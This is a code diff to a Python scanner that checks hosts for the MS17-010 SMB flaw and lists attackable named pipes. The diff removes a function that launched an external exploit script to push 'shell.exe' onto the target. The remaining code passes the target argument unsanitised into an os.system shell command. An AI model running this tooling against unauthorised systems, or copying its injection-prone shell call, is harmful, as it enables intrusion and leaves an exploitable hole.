@@ -6,7 +6,6 @@ from struct import pack
 import sys
 import os
 
-
 '''
 Script for
 - check target if MS17-010 is patched or not.
@@ -32,30 +31,12 @@ pipes = {
     'samr': MSRPC_UUID_SAMR,
 }
 
-
-def bomb(pipe):
-    print "[*] Killing target...    [*]\n"
-    # print "[*] Starting services... [*]\n"
-    #u_choice = raw_input("Shell or Patch? (S/P)")
-    ipaddre = sys.argv[1]  # '192.168.17.134'
-
-    global comman
-    if u_choice == 'S':
-        comman = 'python exp.py ' + ipaddre + ' ' + pipe + ' shell.exe'
-    elif u_choice == 'P':
-        comman = 'python exp.py ' + ipaddre + ' ' + pipe + ' win_7.msu'
-    # elif u_choice == 'I':
-    #     comman = 'python exp.py ' + ipaddre + ' ' + pipe + ' identify.exe'
-    print comman
-    os.system(comman)
-
-
 if len(sys.argv) < 2:
     print("Wrong arguments to checker! <ip>".format(sys.argv[0]))
     sys.exit(1)
 
 target = sys.argv[1]
-print "\nScanning " + target
+print("\nScanning " + target + " for \"eternalsynergy\" and \"eternalromance\" vulnerabilities...")
 
 conn = MYSMB(target)
 try:
@@ -104,36 +85,38 @@ for pipe_name, pipe_uuid in pipes.items():
 
         dce.disconnect()
     except smb.SessionError as e:
-        print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error_code][0]))
+        # print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error_code][0]))
+        print("[*] Connection failed!!  [*]")
     except smbconnection.SessionError as e:
-        print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error][0]))
+        # print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error][0]))
+        print("[*] Connection failed!!  [*]")
 
 conn.disconnect_tree(tid)
 conn.logoff()
 conn.get_socket().close()
-print "\n[*] Attackable namedpipes :P [*]"
+print("\n[*] Attackable namedpipes :P [*]")
 s = ","
-print listing.replace(",", "\n")
+print(listing.replace(",", "\n"))
 
 # Do you want to exploit?
-#ch = raw_input("Run exploit on " + target + "? (Y/N)")
-#if ch == "N" or ch == 'n':
- #   sys.exit(0)
-#vulnerable_addresses = []
+# ch = raw_input("Run exploit on " + target + "? (Y/N)")
+# if ch == "N" or ch == 'n':
+#   sys.exit(0)
+# vulnerable_addresses = []
 listing = listing.replace(",", " ")
 for namedpipe in listing.split():
     try:
-        #print target
+        # print target
         file = 'echo ' + target + ' >> file.txt'
         os.system(file)
         # print namedpipe
-        #vulnerable_addresses.append(target)
-        #print "Target -)", target
+        # vulnerable_addresses.append(target)
+        # print "Target -)", target
         break
         # time.sleep(5)
     except:
-        print ("")
-#for add in vulnerable_addresses:
-    	
+        print("")
+# for add in vulnerable_addresses:
+
 sys.exit(0)
 # os.system("python tcp_server.py")
